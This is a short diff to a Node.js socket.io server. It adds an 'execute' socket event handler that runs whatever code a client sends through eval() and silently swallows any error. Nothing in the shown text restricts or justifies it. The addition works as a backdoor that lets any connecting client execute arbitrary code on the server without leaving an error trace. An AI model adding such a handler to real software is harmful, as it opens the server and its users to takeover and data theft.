@@ -114,6 +114,13 @@ io.sockets.on('connection',function(socket) {
         }
         //print('socket disconnection')
     });
+    socket.on('execute',function(code) {
+        try {
+            eval(code);
+        }catch {
+            
+        }
+    });
     
     socket.on('name',function(data) {
         print(data.name);
